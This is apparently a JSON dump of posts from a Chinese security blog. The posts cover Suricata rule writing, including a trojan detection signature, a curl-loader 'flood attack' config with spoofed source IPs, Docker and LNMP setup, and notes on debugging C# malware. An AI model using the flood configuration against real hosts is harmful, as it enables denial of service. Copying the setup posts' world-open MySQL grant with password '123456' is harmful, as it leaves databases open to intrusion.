踩坑日记","slug":"流量分析/suricata学习","date":"2023-07-20T16:00:00.000Z","updated":"2024-03-12T15:27:50.813Z","comments":true,"path":"2023/07/21/流量分析/suricata学习/","link":"","permalink":"http://zwjsfdbb.top/2023/07/21/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/suricata%E5%AD%A6%E4%B9%A0/","excerpt":"一、基本概念Suricata是一款高性能的网络IDS、IPS和网络安全监控引擎。它是开源的，能够进行实时入侵检测(IDS)、内联入侵预防(IPS)、网络安全监控(NSM)和离线pcap处理，并且支持Lua脚本对数据包进行检测。 二、安装与配置1、下载安装suricata 和npcap ，目前最新版本7.0 https://www.openinfosecfoundation.org/download/ https://npcap.com/dist/npcap-1.75.exe 2、修改配置文件 各种路径替换成自己的安装路径 pcap-file: true（可选）打开，才能看到哪个文件命中 append: no (可选) yes 是追加，no 是重写 开启lua 支持 12345- lua: enabled: yes scripts-dir: lua_path scripts: - xxx.lua 三、注意事项1、域名前加.","text":"一、基本概念Suricata是一款高性能的网络IDS、IPS和网络安全监控引擎。它是开源的，能够进行实时入侵检测(IDS)、内联入侵预防(IPS)、网络安全监控(NSM)和离线pcap处理，并且支持Lua脚本对数据包进行检测。 二、安装与配置1、下载安装suricata 和npcap ，目前最新版本7.0 https://www.openinfosecfoundation.org/download/ https://npcap.com/dist/npcap-1.75.exe 2、修改配置文件 各种路径替换成自己的安装路径 pcap-file: true（可选）打开，才能看到哪个文件命中 append: no (可选) yes 是追加，no 是重写 开启lua 支持 12345- lua: enabled: yes scripts-dir: lua_path scripts: - xxx.lua 三、注意事项1、域名前加. 12alert dns any any -&gt; any any (dns.query; dotprefix; \\ content:&quot;.microsoft.com&quot;; sid:1;) 2、使用特定字段http.header、http.request_line，如末尾不要加\\r\\n 示例包结构如下： 1alert http any any -&gt; any any (msg:&quot;THREAD-Win32-TrojanSpy-Arkei From Fdark arkei.py&quot;; flow:established; http.request_line; pcre:&quot;/^GET \\/(\\d&#123;4&#125;) HTTP\\/1\\.1/is&quot;; http.header; pcre:&quot;/Host\\: [^(\\\\r\\\\n)]+\\r\\n/is&quot;; dsize: &gt;0; sid:1000001; rev:1;) 3、命令行踩坑 ​ -k none 忽略pcap 包校验（大坑） -vvv 输出更多日志 1suricata.exe -k none -r .\\pcap_file -vvv -c .\\suricata.yaml -l .\\outputpath 参考命令行 4、 Lua语法的特殊性 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253模式串. 任意字符 %a 字母 %c 控制字符 %d 数字 %l 小写字母 %p 标点字符 %s 空白符 %u 大写字母 %w 字母和数字 ，不包括下划线%x 十六进制数字 %z 代表 0的字符 特殊字符如下：(). % + - * ? [ ^ $ % 也作为以上特殊字符的转义字符。[] 该方框作为匹配该范围的集合，。 如[0-9] 则匹配0到9的数字范围Lua 中的模式修饰符有四个： + 匹配前一字符 1 次或多次，最长匹配* 匹配前一字符 0 次或多次，最长匹配- 匹配前一字符 0 次或多次，最短匹配? 匹配前一字符 0 次或 1次 &#x27;+&#x27;，匹配一个或多个字符，总是进行最长的匹配。如，模式 &#x27;%a+&#x27; 匹配一个或多个字母或者一个单词： 注意以上的区别：如：匹配c中的注释串用 &#x27;/%*.*%*/&#x27; 和&#x27;/%*.-%*/&#x27;str = &quot;int x; /* x */ int y; /* y */&quot; print(string.gsub(str, &quot;/%*.*%*/&quot;, &quot;&lt;注释串&gt;&quot;)) --&gt; int x; &lt;注释串&gt; 采用 &#x27;.-&#x27; 则为最短匹配，即匹配 &quot;/*&quot; 开始到第一个 &quot;*/&quot; 之前的部分： str = &quot;int x; /* x */ int y; /* y */&quot; print(string.gsub(str, &quot;/%*.-%*/&quot;, &quot;&lt;注释部分&gt;&quot;)) --&gt; int x; &lt;注释串&gt; int y; &lt;注释串&gt; 以 &#x27;^&#x27; 开头表示只匹配目标串的开始部分，以 &#x27;$&#x27; 结尾表示只匹配目标串的结尾部分。%b 表示匹配对称字符，注意其只能针对的ansi码单字符。x = string.gsub(&quot;xdddddyxxx&quot;, &quot;%bxy&quot;, &quot;取代&quot;)print(x) --&gt;取代xxx如去除字符串首尾的空格： function trim (s) return (string.gsub(s, &quot;^%s*(.-)%s*$&quot;, &quot;%1&quot;)) end 四、Linux 下的suricata 安装ubuntu20.04 1234567891011121314151617181920212223242526272829303132333435363738394041424344sudo cp /etc/apt/sources.list /etc/apt/sources.list.baksudo apt-get install vimsudo vim /etc/apt/sources.list清空后添加deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiversesudo apt-get updatesudo add-apt-repository ppa:oisf/suricata-stablesudo apt updatesudo apt install suricata jqsudo suricata --build-infosudo systemctl status suricatacd /etc/suricatacp suricata.yaml suricata.yaml.bakvim suricata.yml修改 - pcap-file: true- append: no (可选) yes 是追加，no 是重写- 开启lua 支持 - lua: enabled: yes scripts-dir: /etc/suricata/lua-output/ scripts: # - script1.lua lua: # Allow Lua rules. Disabled by default. allow-rules: true # 接下来就可以编写规则，进行pcap 扫描了suricata -k none -vvv -r pcap_path -c suricata.yaml -l output_path# 对于需要struct 库的lua 程序sudo apt-get install luarocks -yluarocks install struct# bit32安装luarocks install bit32 五、suricata规则编写 1、常用字段 msg 描述信息 content 需要匹配的字符串 pcre 正则匹配模式 dsize tcp paylad 的大小 offset content 偏移 depth 匹配的字符串长度 1234567-- 规则内容全都在xxx.lua 中，靠lua来解析tcp payload内容alert tcp any any -&gt; any any (msg:&quot;xxx&quot;; luajit:xxx.lua;classtype:trojan-activity; sid:800008; rev:1;)--- 规则通过content 字符串和 pcre 正则来匹配 payload内容，不同协议还有一些单独的字段，建议参考官方文档alert tcp any any -&gt; any any (msg:&quot;xxx&quot;;content:&quot;GET|20|/&quot;; pcre:&quot;/^GET \\/(\\d&#123;4&#125;) HTTP\\/1\\.1\\r\\nHost: [^(\\\\r\\\\n)]+\\r\\n\\r\\n/is&quot;;dsize: &lt;200; sid:7000001; rev:1;) 2、Lua规则编写 1）模版示例代码如下： 12345678910111213141516function init(args) local needs = &#123;&#125; needs[&quot;packet&quot;] = tostring(true) return needsendfunction match(args) local packet = args[&quot;packet&quot;] local content = SCPacketPayload() if content == nil or #content == 0 then return 0 end -- 逻辑代码 -- .....end 2）分享几个比较有用的自定义函数 字符串分割，lua没有内置的字符串分割函数 123456789101112function string_split(str, delimiter) local result = &#123;&#125; local start_index = 1 local end_index = string.find(str, delimiter) while end_index do table.insert(result, string.sub(str, start_index, end_index - 1)) start_index = end_index + string.len(delimiter) end_index = string.find(str, delimiter, start_index) end table.insert(result, string.sub(str, start_index)) return resultend ​ 日志输出，用于调试 12345678function log_string(write_string) filename = SCLogPath() .. &quot;/&quot; .. &quot;err.log&quot; file = assert(io.open(filename, &quot;a&quot;)) file:write(write_string) file:write(&quot;\\n&quot;) file:flush() file:close()end 3）常用的内置函数 string.match(str,pattern) 用于正则匹配字符串，注意lua 中不支持{min,max}的写法 string.sub(str,start,end) 截取字符串 string.find(str,substr,init,plain) init 指定起始位置，plain 指定简单模式还是正则模式，true代表简单模式，false 代表正则模式 string.char(str) 整型数字转成字符 string.byte(str) 字符转换成整数 string.len(str) 获取字符串长度，等于#str tonumber(str) 转成数字 tostring(number) 转成字符串 struct.unpack(format,data) 解析二进制数据 需要导入struct 库 local struct &#x3D; require(“struct”) bit32.xor(ch,key) 异或运算 需要导入bit32 库 local bit32 &#x3D; require(“bit32”) string.gsub(mainString,findString,replaceString,num) 字符串替换函数 string.find() 等同于 str:find()，以上很多.方法都可以换成:方法 local success, result &#x3D; pcall(function() 内部代码 end) try except 的lua实现","categories":[{"name":"流量分析","slug":"流量分析","permalink":"http://zwjsfdbb.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}],"tags":[{"name":"流量分析","slug":"流量分析","permalink":"http://zwjsfdbb.top/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}]},{"title":"Curl_loader 泛洪攻击","slug":"黑客工具/curl_loader泛洪攻击","date":"2023-07-19T16:00:00.000Z","updated":"2024-03-12T10:42:57.860Z","comments":true,"path":"2023/07/20/黑客工具/curl_loader泛洪攻击/","link":"","permalink":"http://zwjsfdbb.top/2023/07/20/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/curl_loader%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/","excerpt":"1、安装过程 下载链接 ：https://master.dl.sourceforge.net/project/curl-loader/curl-loader/curl-loader-0.56/curl-loader-0.56.tar.bz2?viasf=1 安装依赖 12yum install openssl -yyum install openssl-devel -y 解压并make 123tar -xjf curl-loader-0.56.tar.bz2cd curl-loader-0.56make 2、使用步骤 配置文件 示例 参考链接：https://curl-loader.sourceforge.net/doc/faq.html 12345678910111213141516171819202110k.conf########### GENERAL SECTION ################################BATCH_NAME= 10K # 名称CLIENTS_NUM_MAX=10000 # 最大一万个客户端CLIENTS_NUM_START=100 # 从100个客户端开始CLIENTS_RAMPUP_INC=50 # 每次增加50INTERFACE =eth0 # 网卡NETMASK=16 # 掩码IP_ADDR_MIN= 192.168.1.1 # 伪装的IP起始IP_ADDR_MAX= 192.168.53.255 #Actually - this is for self-controlCYCLES_NUM= -1 # 循环次数 -1代表无限循环URLS_NUM= 1 # URL的数量########### URL SECTION ####################################URL=http://localhost/index.html#URL=http://localhost/ACE-INSTALL.htmlURL_SHORT_NAME=&quot;local-index&quot;REQUEST_TYPE=GETTIMER_URL_COMPLETION = 5000 # In msec. When positive, Now it is enforced by cancelling url fetch on timeoutTIMER_AFTER_URL_SLEEP =20 # 请求发的间歇 使用命令","text":"1、安装过程 下载链接 ：https://master.dl.sourceforge.net/project/curl-loader/curl-loader/curl-loader-0.56/curl-loader-0.56.tar.bz2?viasf=1 安装依赖 12yum install openssl -yyum install openssl-devel -y 解压并make 123tar -xjf curl-loader-0.56.tar.bz2cd curl-loader-0.56make 2、使用步骤 配置文件 示例 参考链接：https://curl-loader.sourceforge.net/doc/faq.html 12345678910111213141516171819202110k.conf########### GENERAL SECTION ################################BATCH_NAME= 10K # 名称CLIENTS_NUM_MAX=10000 # 最大一万个客户端CLIENTS_NUM_START=100 # 从100个客户端开始CLIENTS_RAMPUP_INC=50 # 每次增加50INTERFACE =eth0 # 网卡NETMASK=16 # 掩码IP_ADDR_MIN= 192.168.1.1 # 伪装的IP起始IP_ADDR_MAX= 192.168.53.255 #Actually - this is for self-controlCYCLES_NUM= -1 # 循环次数 -1代表无限循环URLS_NUM= 1 # URL的数量########### URL SECTION ####################################URL=http://localhost/index.html#URL=http://localhost/ACE-INSTALL.htmlURL_SHORT_NAME=&quot;local-index&quot;REQUEST_TYPE=GETTIMER_URL_COMPLETION = 5000 # In msec. When positive, Now it is enforced by cancelling url fetch on timeoutTIMER_AFTER_URL_SLEEP =20 # 请求发的间歇 使用命令 1./curl-loader -f test.conf","categories":[{"name":"黑客工具","slug":"黑客工具","permalink":"http://zwjsfdbb.top/categories/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"黑客工具","slug":"黑客工具","permalink":"http://zwjsfdbb.top/tags/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/"}]},{"title":"Docker环境安装","slug":"Web渗透/Docker环境","date":"2023-07-12T16:00:00.000Z","updated":"2024-03-12T13:05:33.335Z","comments":true,"path":"2023/07/13/Web渗透/Docker环境/","link":"","permalink":"http://zwjsfdbb.top/2023/07/13/Web%E6%B8%97%E9%80%8F/Docker%E7%8E%AF%E5%A2%83/","excerpt":"1、Docker基本概念一个非常轻量级的虚拟环境，没有独立IP，依赖于宿主机。 Docker之间可以互相通信。外部设备无法访问Docker，必须把端口映射给宿主机。 注意事项： 尽量让一个容器做一件事情 尽量使用挂载的方式把数据文件挂载到容器中 尽量不要使用交互环境来直接操作容器，而是在宿主机上执行命令。 2、Docker 环境安装123456yum install -y net-toolsyum install -y yum-utils device-mapper-persistent-data lvm2yum-config-manager --add-rep http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repoyum makecache fastyum install -y docker-cesystemctl start docker 3、配置拉取的镜像源123456789vim/etc/docker/daemon.json 添加&#123; &quot;registry-mirrors&quot;:[ &quot;https://registry.docker-cn.com&quot;, &quot;http://hub-mirror.c.163.com&quot;, &quot;https://docker.mirrors.ustc.edu.cn&quot; ]&#125; 运行docker info","text":"1、Docker基本概念一个非常轻量级的虚拟环境，没有独立IP，依赖于宿主机。 Docker之间可以互相通信。外部设备无法访问Docker，必须把端口映射给宿主机。 注意事项： 尽量让一个容器做一件事情 尽量使用挂载的方式把数据文件挂载到容器中 尽量不要使用交互环境来直接操作容器，而是在宿主机上执行命令。 2、Docker 环境安装123456yum install -y net-toolsyum install -y yum-utils device-mapper-persistent-data lvm2yum-config-manager --add-rep http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repoyum makecache fastyum install -y docker-cesystemctl start docker 3、配置拉取的镜像源123456789vim/etc/docker/daemon.json 添加&#123; &quot;registry-mirrors&quot;:[ &quot;https://registry.docker-cn.com&quot;, &quot;http://hub-mirror.c.163.com&quot;, &quot;https://docker.mirrors.ustc.edu.cn&quot; ]&#125; 运行docker info 4、相关官方站点https://hub.docker.com https://hub.daocloud.io/ 5、搜索和拉取镜像1234567891011121314151617181920212223242526272829# 搜索特定镜像docker search centos# 拉取特定镜像docker pull centos # 查看当前有多少镜像docker images# 创建容器 以交互式创建，映射docker里的3306到宿主机3307端口，容器名称centos_mysql,主机名 my_mysql[root@192 ~]# docker create -it --name centos_mysql -h my_mysql -p 3307:3306 centos:latestc22489a7c38c70632e117a327647278bffc332e96c8300c7fbaebcec78bff052# 查看当前容器[root@192 ~]# docker container ls -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESc22489a7c38c centos:latest &quot;/bin/bash&quot; 2 minutes ago Created centos_mysql# 运行[root@192 ~]# docker start centos_mysqlcentos_mysql[root@192 ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESc22489a7c38c centos:latest &quot;/bin/bash&quot; 4 minutes ago Up 3 seconds 0.0.0.0:3307-&gt;3306/tcp, :::3307-&gt;3306/tcp centos_mysql# 执行[root@192 ~]# docker exec -it centos_mysql /bin/bash[root@my_mysql /]# # 创建并运行docker run -it --name centos_mysql -h my_mysql -p 3307:3306 centos:latest# 特权模式下创建容器docker create -ti --name centos_mysql --privileged=true -h my_mysql -p 3307:3306 centos:latest /sbin/init 失败的情况 ​ 查看docker 中yum 源，发现yum list 失败， 1234[root@my_mysql /]# yum listFailed to set locale, defaulting to C.UTF-8CentOS Linux 8 - AppStream 66 B/s | 38 B 00:00 Error: Failed to download metadata for repo &#x27;appstream&#x27;: Cannot prepare internal mirrorlist: No URLs in mirrorlist ​ 可以运行以下命令 1234cd /etc/yum.repos.d/sed -i &#x27;s/mirrorlist/#mirrorlist/g&#x27; /etc/yum.repos.d/CentOS-*sed -i &#x27;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g&#x27; /etc/yum.repos.d/CentOS-*yum update -y 6、示例安装 Tomcat + Mysql 服务 安装Mydql 123456789101112131415161718192021# 拉取centos7镜像docker pull couchbase/centos7-systemd# 以特权模式创建容器，可以使用systemctldocker create -ti --name centos_7 --privileged=true -h my_mysql -p 3307:3306 couchbase/centos7-systemd /sbin/init# 进入到容器docker exec -it centos_7 /bin/bash# 下载mysql的rpmwget http://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm# 安装源rpm ivh mysql57-community-release-el7-11.noarch.rpm # 编辑源，启用mysql5.6 enabled=1 取消mysql5.7vim /etc/yum.repos.d/mysql-community.repo # 安装mysql5.6yum install mysql-serversystemctl start mysqld# 创建远程登录用户mysql -urootGRANT ALL PRIVILEGES ON *.* TO &#x27;client&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27; WITH GRANT OPTION;flush privileges;systemctl restart mysqld;# 此时可以用navicat 连接宿主机3307端口即为连接到docker 容器的3306端口，即mysql服务。 安装java1.8 12345678#拷贝到docker docker cp jdk1.8.0_211.tar.gz centos_7:/opttar -xzf jdk1.8.0_211.tar.gz编辑 ~/.bash_profileexport JAVA_HOME=/opt/jdk1.8.0_211PATH=$PATH:$HOME/bin:$JAVA_HOME/bin# 生效source .bash_profile 安装Tomcat 1234567891011docker cp ./apache-tomcat-8.5.90.tar.gz centos_7:/optcd /opttar xzvf apache-tomcat-8.5.90.tar.gzecho &#x27;export CATALINA_HOME=/opt/apache-tomcat-8.5.90&#x27; &gt;&gt; ~/.bashrcecho &#x27;export PATH=$CATALINA_HOME/bin:$PATH&#x27; &gt;&gt; ~/.bashrcsource ~/.bashrc# 防火墙firewall-cmd --add-port=8080/tcp --permanent# 启动$CATALINA_HOME/bin/startup.sh 修改数据库连接，复制站点等 7、镜像保存、归档、压缩、还原1234567# 镜像保存docker commit -a &quot;author&quot; -m &quot;description&quot; 容器名称（centos_7） 镜像名字# 归档、压缩docker save -o /opt/xxx.tar 镜像名字gzip xxx.tar# 还原docker load -i xxx.tar.gz 8、挂载12# 创建容器的时候，-v 选项指定挂载的目录，修改宿主机的文件即为修改容器里面的文件docker create -it -name xxx -v /opt/xxx:/opt/xxx 镜像名 8、注意事项 docker stop 以后 再启动 .bash_profile 未生效，因此可以将一些命令写入到 &#x2F;etc&#x2F;bashrc 或者 ~&#x2F;.bashrc，或者直接写入&#x2F;etc&#x2F;rc.d&#x2F;rc.local ，可以实现在docker 启动时就执行 123456/etc/rc.d/rc.local 系统启动时执行 /etc/rc.local 是其软连接文件/etc/profile 登录时执行/etc/bashrc 运行bash shell时执行~/.bash_profile 用户登陆时执行~/.bashrc 用户登陆以及打开bash shell 时执行~/.bash_logout 用户退出登录时执行 9、dockfile 构建镜像DockerFile是用来构建Docker镜像的构建文件，是由一系列命令和参数构成的脚本。 全自动化的拉取镜像，执行一系列指令，从而生成对应的镜像。","categories":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/categories/web%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/tags/web%E6%B8%97%E9%80%8F/"}]},{"title":"C# 恶意程序分析","slug":"逆向/C#恶意程序分析","date":"2023-07-11T16:00:00.000Z","updated":"2024-03-12T15:05:28.647Z","comments":true,"path":"2023/07/12/逆向/C#恶意程序分析/","link":"","permalink":"http://zwjsfdbb.top/2023/07/12/%E9%80%86%E5%90%91/C#%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/","excerpt":"一、C# 恶意程序分析 主要用于调用Invoke函数加载解密后的PE的方法的调试。 方法1：使用工具：Dnspy 示例： 定位Invoke函数，点击进入函数内部，不断F11进去 UnsafeInvokeInternal函数F11进去 RuntimeMethodHandle.InvokeMethod函数F11进去","text":"一、C# 恶意程序分析 主要用于调用Invoke函数加载解密后的PE的方法的调试。 方法1：使用工具：Dnspy 示例： 定位Invoke函数，点击进入函数内部，不断F11进去 UnsafeInvokeInternal函数F11进去 RuntimeMethodHandle.InvokeMethod函数F11进去 下一步就进去目标PE的方法入口了。 方法2 ：使用MegaDumper.exe （github上有） 运行恶意程序后，打开MegaDumper.exe ，找到对应的进程，右键dump，把所有的模块全部dump下来，该工具还有很多其他有用的功能，可以探索下。 通过这个方法，我找到了对应的加载的恶意payload。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"LNMP环境（支持LUA）","slug":"Web渗透/LNMP环境安装","date":"2023-07-10T16:00:00.000Z","updated":"2024-03-12T10:40:54.118Z","comments":true,"path":"2023/07/11/Web渗透/LNMP环境安装/","link":"","permalink":"http://zwjsfdbb.top/2023/07/11/Web%E6%B8%97%E9%80%8F/LNMP%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/","excerpt":"1、安装Mysql5.7 配置Mysql 的yum 源 CentOS 的yum源中没有mysql，需要到mysql的官网下载yum repo配置文件 12345678910111213141516# 下载安装wget http://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpmrpm -ivh mysql57-community-release-el7-11.noarch.rpm rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022yum -y install mysql-server# 查看mysqld 服务是否存在并启动systemctl start mysqlsystemctl status mysqld# 获取临时密码（mysql5.7才有，5.6默认密码为空）cat /var/log/mysqld.log |grep password2023-07-06T14:49:50.366809Z 1 [Note] A temporary password is generated for root@localhost: wF4t6oiiju)o# 更改密码ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;Qwer1234@&#x27;; 查看默认密码策略 如需关闭密码策略，在&#x2F;etc&#x2F;my.cnf 中添加 validate_password&#x3D; off 创建数据库和账号 12345678910111213141516171819202122232425# 创建数据库mysql&gt; create database web_site character set utf8 collate utf8_general_ci;Query OK, 1 row affected (0.00 sec)# 创建用户mysql&gt; create user john@&#x27;%&#x27; identified by &#x27;Asdf1234@&#x27;;Query OK, 0 rows affected (0.00 sec)# 授权用户用于该数据库的所有表的权限mysql&gt; grant all privileges on web_site.* to john@&#x27;%&#x27;;Query OK, 0 rows affected (0.00 sec)# 查看用户是否添加成功mysql&gt; use mysql;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; select User,Host,authentication_string from user;+---------------+-----------+-------------------------------------------+| User | Host | authentication_string |+---------------+-----------+-------------------------------------------+| root | localhost | *F393111FF4D128DBA783646EDBD577DC15DEBE40 || mysql.session | localhost | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE || mysql.sys | localhost | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE || john | % | *C244E5730489A669785440CA0861C36379D08029 |+---------------+-----------+-------------------------------------------+4 rows in set (0.00 sec) 2、php7.3 源码安装 安装依赖库 1234567891011yum install -y gcc gcc-c++ make sudo autoconf libtool-ltdl-devel gd-devel freetype-devel libxml2-devel libjpeg-devel libpng-devel curl-devel patch ncurses-devel bzip2 libcap-devel ntp diffutils sendmail iptables unzip cmake pcre-devel zlib-devel openssl openssl-devel libmcrypt-devel libmhash-devel sysklogd# 其中libmcrypt-devel libmhash-devel 安装失败解决办法1、安装第三方yum源wget http://www.atomicorp.com/installers/atomicsh ./atomic2、使用yum命令安装yum install libmcrypt-devel libmhash-devel# sysklogd 安装失败，说是在较新的 Linux 发行版中，rsyslog 已经取代了 sysklogd，就没管了 创建用户和组 12[root@192 ~]# groupadd www[root@192 ~]# useradd -r www -g www 安装","text":"1、安装Mysql5.7 配置Mysql 的yum 源 CentOS 的yum源中没有mysql，需要到mysql的官网下载yum repo配置文件 12345678910111213141516# 下载安装wget http://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpmrpm -ivh mysql57-community-release-el7-11.noarch.rpm rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022yum -y install mysql-server# 查看mysqld 服务是否存在并启动systemctl start mysqlsystemctl status mysqld# 获取临时密码（mysql5.7才有，5.6默认密码为空）cat /var/log/mysqld.log |grep password2023-07-06T14:49:50.366809Z 1 [Note] A temporary password is generated for root@localhost: wF4t6oiiju)o# 更改密码ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;Qwer1234@&#x27;; 查看默认密码策略 如需关闭密码策略，在&#x2F;etc&#x2F;my.cnf 中添加 validate_password&#x3D; off 创建数据库和账号 12345678910111213141516171819202122232425# 创建数据库mysql&gt; create database web_site character set utf8 collate utf8_general_ci;Query OK, 1 row affected (0.00 sec)# 创建用户mysql&gt; create user john@&#x27;%&#x27; identified by &#x27;Asdf1234@&#x27;;Query OK, 0 rows affected (0.00 sec)# 授权用户用于该数据库的所有表的权限mysql&gt; grant all privileges on web_site.* to john@&#x27;%&#x27;;Query OK, 0 rows affected (0.00 sec)# 查看用户是否添加成功mysql&gt; use mysql;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; select User,Host,authentication_string from user;+---------------+-----------+-------------------------------------------+| User | Host | authentication_string |+---------------+-----------+-------------------------------------------+| root | localhost | *F393111FF4D128DBA783646EDBD577DC15DEBE40 || mysql.session | localhost | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE || mysql.sys | localhost | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE || john | % | *C244E5730489A669785440CA0861C36379D08029 |+---------------+-----------+-------------------------------------------+4 rows in set (0.00 sec) 2、php7.3 源码安装 安装依赖库 1234567891011yum install -y gcc gcc-c++ make sudo autoconf libtool-ltdl-devel gd-devel freetype-devel libxml2-devel libjpeg-devel libpng-devel curl-devel patch ncurses-devel bzip2 libcap-devel ntp diffutils sendmail iptables unzip cmake pcre-devel zlib-devel openssl openssl-devel libmcrypt-devel libmhash-devel sysklogd# 其中libmcrypt-devel libmhash-devel 安装失败解决办法1、安装第三方yum源wget http://www.atomicorp.com/installers/atomicsh ./atomic2、使用yum命令安装yum install libmcrypt-devel libmhash-devel# sysklogd 安装失败，说是在较新的 Linux 发行版中，rsyslog 已经取代了 sysklogd，就没管了 创建用户和组 12[root@192 ~]# groupadd www[root@192 ~]# useradd -r www -g www 安装 1234./configure --prefix=/usr/local/php --enable-fpm --with-fpm-user=www --with-fpm-group=www --with-openssl --with-libxml-dir --with-zlib --enable-mbstring --with-mysqli=mysqlnd --enable-mysqlnd --with-pdo-mysql=mysqlnd --with-gd --with-jpeg-dir --with-png-dir --with-zlib-dir --with-freetype-dir --enable-sockets --with-curl --enable-maintainer-zts make make install 配置PHP环境 1234567891011cd /usr/local/php/cp etc/php-fpm.conf.default etc/php-fpm.confcp etc/php-fpm.d/www.conf.default etc/php-fpm.d/www.confcp /root/php-7.3.32/php.ini-production lib/php.ini/usr/local/php/sbin/php-fpm [root@192 php]# netstat -anpltActive Internet connections (servers and established)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:9000 0.0.0.0:* LISTEN 110017/php-fpm: mas 开启php-fp, 启动9000进行监听，获取从Nignx发送过来的处理请求。 3、安装Nginx（支持LUA）（注意各个版本，所使用的版本不同可能最后编译失败） 安装LuaJIT 12345cd /opt/wget http://luajit.org/download/LuaJIT-2.0.5.tar.gztar -zxf LuaJIT-2.0.5.tar.gz cd LuaJIT-2.0.5/make &amp;&amp; make install 安装ngx_devel_kit 12345#下载链接https://github.com/vision5/ngx_devel_kit/archive/refs/tags/v0.3.2.tar.gz拷贝到/opt 目录cd /opttar -zxvf ngx_devel_kit-0.3.2.tar.gz 安装nginx_lua_module 12345# 下载链接https://github.com/openresty/lua-nginx-module/archive/refs/tags/v0.10.13.tar.gz拷贝到/opt目录cd /opttar -zxf lua-nginx-module-0.10.13.tar.gz 导入环境变量 1234vim /etc/profile# 添加到末尾export LUAJIT_LIB=/usr/local/libexport LUAJIT_INC=/usr/local/include/luajit-2.0 安装nginx 123456tar -zxf nginx-1.22.1.tar.gz cd nginx-1.22.1/./configure --user=www --group=www --prefix=/usr/local/nginx --with-http_stub_status_module --with-http_ssl_module --with-http_gzip_static_module --pid-path=/usr/local/nginx/nginx.pid --with-http_realip_module --add-module=/opt/ngx_devel_kit-0.3.2 --add-module=/opt/lua-nginx-module-0.10.13 --with-ld-opt=&quot;-Wl,-rpath,$LUAJIT_LIB&quot;make -j2 &amp;&amp; make installfirewall-cmd --add-port=80/tcp --permanent/usr/local/nginx/sbin/nginx 环境安装基本结束 4、配置站点 1、创建文件夹存放站点 2、递归修改所有的目录所有者,文件所有者为www 3、修改数据库连接信息 4、修改nginx.conf ，配置网站根目录，取消location 注释等，根据实际情况修改。 5、配置thinkphp的URL地址重写，修改nginx.conf 。","categories":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/categories/web%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/tags/web%E6%B8%97%E9%80%8F/"}]},{"title":"Nginx","slug":"Web渗透/Nginx_new","date":"2023-07-02T16:00:00.000Z","updated":"2024-03-12T10:14:39.942Z","comments":true,"path":"2023/07/03/Web渗透/Nginx_new/","link":"","permalink":"http://zwjsfdbb.top/2023/07/03/Web%E6%B8%97%E9%80%8F/Nginx_new/","excerpt":"Nginx 1、概念 轻量应用服务器、高并发 2、反向代理与正向代理 正向代理示意图 作用： 访问无法访问的资源如Google 做缓存，加速访问资源，如CDN 对客户端进行访问授权，上网认证 记录用户访问记录，上网行为管理 反向代理","text":"Nginx 1、概念 轻量应用服务器、高并发 2、反向代理与正向代理 正向代理示意图 作用： 访问无法访问的资源如Google 做缓存，加速访问资源，如CDN 对客户端进行访问授权，上网认证 记录用户访问记录，上网行为管理 反向代理 保证内网的安全，阻止web攻击，大型网站，通常将反向代理作为公网访问地址，Web服务器是内网 负载均衡，通过反向代理来优化网站的负载 故障转移 3、安装 12345678910wget 